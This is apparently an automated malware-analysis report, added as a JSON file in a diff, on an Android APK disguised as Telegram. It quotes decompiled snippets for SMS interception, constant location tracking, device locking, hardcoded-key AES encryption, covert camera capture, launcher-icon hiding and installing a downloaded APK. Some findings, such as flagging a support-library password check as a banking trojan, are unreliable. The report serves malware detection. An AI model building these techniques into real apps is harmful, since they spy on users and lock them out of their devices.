@@ -1,0 +1,288 @@
+{
+  "APK信息": {
+    "文件名": "45ab522d313f52e5521c8675a8427e7671f096a6296a73a877d709049e4ed074.apk",
+    "sha256": "45ab522d313f52e5521c8675a8427e7671f096a6296a73a877d709049e4ed074",
+    "包名": "org.telegram.messenger",
+    "应用名": "Telegram",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 577.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "SMS_RECEIVED"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "setupLogging()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "smsObserver = new SmsObserver(this, this.mHandlering);\nIntentFilter smsFilter = new IntentFilter(Defines.SMS_RECEIVED);\nregisterReceiver(smsObserver.inSms, smsFilter);",
+          "malicious_code_snippet_context": "              IntentFilter wifiFilter = new IntentFilter(\"android.net.wifi.supplicant.CONNECTION_CHANGE\");\n              this.wifiReceiver = new WifiStatusManager(this);\n              registerReceiver(this.wifiReceiver, wifiFilter);\n>>>             smsObserver = new SmsObserver(this, this.mHandlering);\n>>>             IntentFilter smsFilter = new IntentFilter(Defines.SMS_RECEIVED);\n>>>             registerReceiver(smsObserver.inSms, smsFilter);\n              IntentFilter callsFilter = new IntentFilter(\"android.intent.action.PHONE_STATE\");\n              callsFilter.addAction(\"android.intent.action.NEW_OUTGOING_CALL\");\n              this.callsReceiver = new CallsManager(this);",
+          "behavior_description": "代码动态注册了一个 BroadcastReceiver（smsObserver.inSms）监听 android.provider.Telephony.SMS_RECEIVED 广播，用于拦截设备接收到的短信。在恶意样本上下文中，该接收器可截获短信内容（包括验证码、银行通知等敏感信息），并将数据外传或根据指令隐藏/删除特定短信，导致用户无法察觉短信被窃取。数据流向为：系统短信广播(SMS_RECEIVED)→自定义SmsObserver接收器拦截处理。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\AMService;",
+          "method_signature": "run()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.mLocMngr.requestLocationUpdates(provider, 0L, 0.0f, new AMLocListener());\nLocation lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"gps\");\nif (lastKnownLocation == null) {\n    lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"network\");\n}\nif (lastKnownLocation == null) {\n    TelephonyManager tm = (TelephonyManager) getSystemService(\"phone\");\n    if (tm.getCellLocation() != null) {\n        sb.append(String.valueOf(tm.getCellLocation().toString()) + \"\\r\\n\");\n    }\n    for (NeighboringCellInfo nci : tm.getNeighboringCellInfo()) {",
+          "malicious_code_snippet_context": "                  public void run() {\n                      Looper.prepare();\n                      AMService.this.mUserLocationHandler = new Handler();\n>>>                     AMService.this.mLocMngr.requestLocationUpdates(provider, 0L, 0.0f, new AMLocListener());\n>>>                     Looper.loop();\n>>>                 }\n>>>             });\n>>>             t.start();\n>>>             onCommandInfoEvent(\"Wait to device obtain location\");\n>>>         }\n>>>         Location lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"gps\");\n>>>         if (lastKnownLocation == null) {\n>>>             lastKnownLocation = this.mLocMngr.getLastKnownLocation(\"network\");\n>>>         }\n          if (lastKnownLocation == null) {\n              TelephonyManager tm = (TelephonyManager) getSystemService(\"phone\");\n              StringBuffer sb = new StringBuffer();",
+          "behavior_description": "该代码在后台线程中通过LocationManager以最小时间间隔(0L)和最小距离(0.0f)持续请求位置更新，实现高频位置追踪。随后尝试通过GPS和网络提供者获取最后已知位置；若均失败，则回退到TelephonyManager获取基站位置(CellLocation)和邻区基站信息(NeighboringCellInfo)作为位置替代。数据流向为：GPS/Network定位提供者及基站信息(source)→持续位置更新注册与位置数据收集(sink)。类名伪装为com.andriod.browser（注意andriod拼写错误），具有隐蔽性。在已确认恶意样本中，此行为属于过度收集用户位置隐私。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "DevicePolicyManager"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\ScreenControl;",
+          "method_signature": "turnOff(Context context)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\ndevicePolicyManager.lockNow();",
+          "malicious_code_snippet_context": "  \n      public static void turnOff(Context context) {\n          try {\n>>>             DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>             devicePolicyManager.lockNow();\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该代码通过 Context 获取 DevicePolicyManager 实例，调用 lockNow() 方法立即锁定设备屏幕。在勒索软件场景中，此行为用于强制锁定用户设备，使用户无法正常使用手机，配合可能的 resetPassword() 实现勒索锁定效果。数据流向：context.getSystemService(\"device_policy\") → devicePolicyManager.lockNow()，即通过系统服务获取设备策略管理器后执行强制锁屏操作。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\andriod\\browser\\Utils;",
+          "method_signature": "encrypt(String strToEncrypt)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Cipher _Cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\nKey SecretKey = new SecretKeySpec(\"1234567890123456\".getBytes(), \"AES\");\n_Cipher.init(1, SecretKey, ivspec);\nreturn _Cipher.doFinal(strToEncrypt.getBytes());",
+          "malicious_code_snippet_context": "  \n      public static byte[] encrypt(String strToEncrypt) {\n          try {\n>>>             Cipher _Cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n>>>             byte[] iv = {1, 2, 3, 4, 5, 6, 6, 5, 4, 3, 2, 1, 7, 7, 7, 7};\n>>>             IvParameterSpec ivspec = new IvParameterSpec(iv);\n>>>             Key SecretKey = new SecretKeySpec(\"1234567890123456\".getBytes(), \"AES\");\n              _Cipher.init(1, SecretKey, ivspec);\n              return _Cipher.doFinal(strToEncrypt.getBytes());\n          } catch (Exception e) {",
+          "behavior_description": "使用硬编码的AES密钥和初始化向量(IV)对传入的字符串数据进行加密，属于勒索软件加密用户数据的核心行为。数据来源为方法参数strToEncrypt（通常为读取的文件内容或路径），危险操作为调用Cipher.doFinal()执行加密。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\view\\accessibility\\AccessibilityNodeInfoCompat;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean isPassword(Object obj);",
+          "malicious_code_snippet_context": "  \n          boolean isMultiLine(Object obj);\n  \n>>>         boolean isPassword(Object obj);\n  \n          boolean isScrollable(Object obj);\n  ",
+          "behavior_description": "该代码通过 AccessibilityNodeInfoCompat 的 isPassword() 方法检测当前无障碍服务遍历到的UI节点是否为密码输入框。在银行木马场景中，恶意软件利用无障碍服务读取目标银行/金融App界面，通过 isPassword() 定位密码输入字段，进而配合 getText() 等方法提取用户输入的凭证信息。数据流向为：无障碍服务遍历目标App界面节点(AccessibilityNodeInfo) → isPassword()识别密码字段 → 后续窃取凭证数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\UpdateApp;",
+          "method_signature": "if(len1 != -1)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "intent.setDataAndType(Uri.fromFile(new File(\"/mnt/sdcard/Download/update.apk\")), \"application/vnd.android.package-archive\");\nintent.setFlags(268435456);\nthis.context.startActivity(intent);",
+          "malicious_code_snippet_context": "                      fos.close();\n                      is.close();\n                      Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>                     intent.setDataAndType(Uri.fromFile(new File(\"/mnt/sdcard/Download/update.apk\")), \"application/vnd.android.package-archive\");\n>>>                     intent.setFlags(268435456);\n>>>                     this.context.startActivity(intent);\n                      return null;\n                  }\n              }",
+          "behavior_description": "代码从网络连接下载APK文件保存到/mnt/sdcard/Download/update.apk，随后构造ACTION_VIEW Intent并设置application/vnd.android.package-archive MIME类型，通过startActivity调起系统安装器诱导用户安装该APK。类名伪装为com.andriod.browser.UpdateApp（注意andriod拼写错误），具有明显的伪装更新攻击特征，属于伪装系统更新诱导安装恶意APK的行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\CameraView;",
+          "method_signature": "run()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.mCamera.setPreviewDisplay(holder);\nthis.mCamera.startPreview();\nhandler.postDelayed(new Runnable() {\n    public void run() {\n        CameraView.this.mCamera.takePicture(null, CameraView.this.mPictureCallback, CameraView.this.mPictureCallback);\n    }\n}, 1000L);",
+          "malicious_code_snippet_context": "                  }\n                  this.mCamera.getParameters();\n                  AMService.gService.onCommandInfoEvent(\"Take photo start\");\n>>>                 this.mCamera.setPreviewDisplay(holder);\n>>>                 this.mCamera.startPreview();\n>>>                 this.mPreviewRunning = true;\n>>>                 Handler handler = new Handler();\n>>>                 handler.postDelayed(new Runnable() { // from class: com.andriod.browser.CameraView.2\n>>>                     @Override // java.lang.Runnable\n>>>                     public void run() {\n                          CameraView.this.mCamera.takePicture(null, CameraView.this.mPictureCallback, CameraView.this.mPictureCallback);\n                      }\n                  }, 1000L);",
+          "behavior_description": "代码在后台启动摄像头预览并延时1秒后调用takePicture进行拍照，通过mPictureCallback获取图像数据，属于在恶意样本中秘密采集用户照片的隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andriod\\browser\\Browser;",
+          "method_signature": "HideShorcute()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager pm = getPackageManager();\npm.setComponentEnabledSetting(getComponentName(), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      void HideShorcute() {\n>>>         PackageManager pm = getPackageManager();\n>>>         pm.setComponentEnabledSetting(getComponentName(), 2, 1);\n      }\n  \n      void ShowBrowser() {",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将应用主组件状态设置为 COMPONENT_ENABLED_STATE_DISABLED（值=2），使应用图标从启动器中隐藏，从而逃避用户检测和卸载。数据流向：getComponentName()（获取当前应用主组件）→ setComponentEnabledSetting()（禁用组件，隐藏图标）。这是 Android 恶意软件常用的隐蔽驻留手段，配合 DevicePolicyManager 设备管理员权限请求，进一步增加卸载难度。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
